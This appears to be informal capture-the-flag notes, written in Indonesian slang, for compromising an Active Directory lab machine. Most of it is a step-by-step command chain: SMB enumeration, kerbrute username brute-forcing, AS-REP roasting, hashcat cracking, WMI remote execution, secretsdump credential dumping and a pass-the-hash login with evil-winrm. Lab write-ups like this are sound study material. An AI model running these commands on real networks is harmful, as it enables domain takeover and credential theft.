# 1. users.txt :

> scan semua, 445 ada tuh cek2 isinya

## enum smb

> smbclient -L //ip -> next masuk smbclient //ip/dir

> cek yg gada $, masuk aja get semua file

> cat 1 1, ambil semua username nya, bikin tools generate username dari gpt sama baca WU

> next generate wordlist pake tools tadi

## enum username

> next cek nama domain nya di scanning nmap, di ldap tuh, gausah masukin 0. nya

> go install kerbrute aja, next ke /home/go, pindah ke which $SHELL nya, pake aja

> kerbrute userenum -d namadomain --dc ip [wordlist]

> dapet tuh username2 yg ada disitu

## enum AS-REP roastable, vuln user enum, cek yg bisa run tanpa passwd

> impacket-GetNPUsers -no-pass -dc-ip [ip_target] -usersfile [usersvalid.txt] [namadomain]/

> usersvalid.txt cukup wordlist polosan aja gausah di @domain.local, jadi kalo john@domain.local, pake john aja

> namadomain cek di scan nmap tadi di ldap

> dah dapet tuh passwd hashnya

## enum passwd skid

> cek code hashmap kerberos, atau as-rep

> 18200 tuh dapet cek aja

> hashcat -m [codenya] [hashnya] /ke/rockyou.txt

## enum: disk smb for user :

> smbmap -u [uname] -p [password] -H [ip]

> cek aja nanti baru smb kesana

> kelar smb kesana ke yg baru2 noh netlogon misal

> get aja ada catatan reset password, baca aja disitu ada creds, username nya tapi ga kapital

> smbmap lagi pake user yg baru dapet itu, ada tuh ampe admin2

## rce access shell via WMI :

> impacket-wmiexec domain/[uname]:[passwd]@[ip]

## dump all creds :

> impacket-secretsdump domain/[uname]:[passwd]@[ip]

## get hash passwd :

> kan ada ini

> Administrator:500:xxx:yyy:::

> ambil Administrator sama yyy nya -> admin:hash

## login as admin :

> evil-winrm -i [ip] -u [username ato admin] -h [hashnya] -N

## klaim all flag

